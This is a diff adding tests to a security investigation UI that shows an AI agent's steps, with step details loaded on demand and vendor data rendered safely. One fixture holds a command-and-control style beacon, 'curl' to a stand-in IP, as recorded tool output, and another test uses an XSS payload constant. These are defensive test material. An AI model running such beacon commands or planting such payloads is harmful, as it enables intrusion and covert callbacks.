@@ -197,6 +197,55 @@ test("agent steps are a timeline list with the totals first", async () => {
   expect(before(total, items[0])).toBe(true);
 });
 
+// ----- a step's details: fetched when opened, not with the list -----
+async function openStepDetails(index: number) {
+  const steps = await screen.findByRole("region", { name: "Agent steps" });
+  if (!(steps.querySelector("details.steps-box") as HTMLDetailsElement).open) {
+    await userEvent.click(steps.querySelector("summary.steps-total")!);
+  }
+  const item = within(steps).getAllByRole("listitem")[index];
+  await userEvent.click(within(item).getByText("Details"));
+  return item;
+}
+
+test("a tool step's input and output are fetched only when its details are opened", async () => {
+  const fetched: string[] = [];
+  server.events.on("request:start", ({ request }) => {
+    if (request.url.includes("/steps/")) fetched.push(new URL(request.url).pathname);
+  });
+  renderAt("/cases/41");
+  const steps = await screen.findByRole("region", { name: "Agent steps" });
+  await userEvent.click(steps.querySelector("summary.steps-total")!);
+  expect(fetched).toEqual([]);                                         // the list alone fetches no step
+
+  const item = await openStepDetails(1);
+  expect(await within(item).findByRole("heading", { name: "Output" })).toBeVisible();
+  expect(item).toHaveTextContent('"pid": 4312');                       // input
+  expect(item).toHaveTextContent("curl -s http://203.0.113.50:8443/beacon");  // output
+  expect(item).toHaveTextContent(XSS);                                 // vendor data shown as text
+  expect(item.querySelector("img")).toBeNull();
+  expect(fetched).toEqual(["/api/investigations/aaaaaaaa-0000-0000-0000-000000000041/steps/1"]);
+  server.events.removeAllListeners();
+});
+
+test("a model step shows its message, or says it only called tools", async () => {
+  renderAt("/cases/41");
+  const verdict = await openStepDetails(2);
+  expect(await within(verdict).findByText("Beaconing confirmed; submitting.")).toBeVisible();
+
+  const plan = await openStepDetails(0);
+  expect(await within(plan).findByText("No message: the model only called tools.")).toBeVisible();
+});
+
+test("a tool step from a run saved before outputs were kept says so", async () => {
+  server.use(http.get(api("/investigations/:id/steps/:index"), () =>
+    HttpResponse.json({ investigation_id: "aaaaaaaa-0000-0000-0000-000000000041", index: 1, kind: "tool",
+                        name: "edr.process_tree", text: null, args: { host: "web-srv-01" }, result: null, error: null })));
+  renderAt("/cases/41");
+  const item = await openStepDetails(1);
+  expect(await within(item).findByText("Not recorded: this run was saved before tool outputs were kept.")).toBeVisible();
+});
+
 // ----- investigation cards: the latest run and earlier ones, newest first -----
 type Run = NonNullable<typeof INVESTIGATIONS_41.latest>;
 const run = (n: number, over: Partial<Run> = {}): Run => ({
